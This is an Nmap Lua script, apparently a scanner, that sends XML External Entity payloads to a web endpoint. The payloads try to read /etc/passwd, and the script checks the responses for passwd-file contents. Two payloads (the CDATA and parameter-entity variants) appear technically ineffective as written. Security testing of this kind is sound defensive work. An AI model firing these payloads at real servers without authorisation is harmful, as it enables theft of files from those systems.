local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Tests for XML External Entity (XXE) vulnerabilities in web applications.
Sends crafted XML payloads to endpoints that accept XML input.
]]

---
-- @usage
-- nmap --script http-xxe -p 80,443 <target>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-xxe:
-- |   Potential XXE vulnerability:
-- |     Endpoint: /api/xml
-- |     Payload type: File disclosure
-- |     Response contains /etc/passwd content
-- |_  Use --script-args http-xxe.url=<url> to test specific endpoint

author = "Nemue Security"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = shortport.http

local xxe_payloads = {
  {
    name = "File disclosure",
    payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
  },
  {
    name = "Parameter entity",
    payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>'
  },
  {
    name = "CDATA injection",
    payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><![CDATA[&xxe;]]></root>'
  }
}

local xxe_indicators = {
  "root:x:0:0",
  "daemon:x:1:1",
  "/bin/bash",
  "/bin/sh"
}

local function test_xxe(host, port, path, payload_info)
  local headers = {
    ["Content-Type"] = "application/xml"
  }

  local response = http.post(host, port, path, {
    headers = headers,
    body = payload_info.payload
  })

  if response and response.body then
    for _, indicator in ipairs(xxe_indicators) do
      if response.body:match(indicator) then
        return true, indicator
      end
    end
  end
  return false, nil
end

action = function(host, port)
  local path = stdnse.get_script_args(SCRIPT_NAME .. ".url") or "/"
  local output = {}
  local vuln_count = 0

  for _, payload_info in ipairs(xxe_payloads) do
    local vulnerable, indicator = test_xxe(host, port, path, payload_info)

    if vulnerable then
      vuln_count = vuln_count + 1
      table.insert(output, string.format("Endpoint: %s", path))
      table.insert(output, string.format("Payload type: %s", payload_info.name))
      table.insert(output, string.format("Indicator found: %s", indicator))
      table.insert(output, "")
    end
  end

  if #output > 0 then
    local result = {}
    table.insert(result, "Potential XXE Vulnerabilities Found:")
    table.insert(result, "")
    for _, line in ipairs(output) do
      table.insert(result, line)
    end
    return table.concat(result, "\n")
  end

  return "No XXE vulnerabilities detected"
end
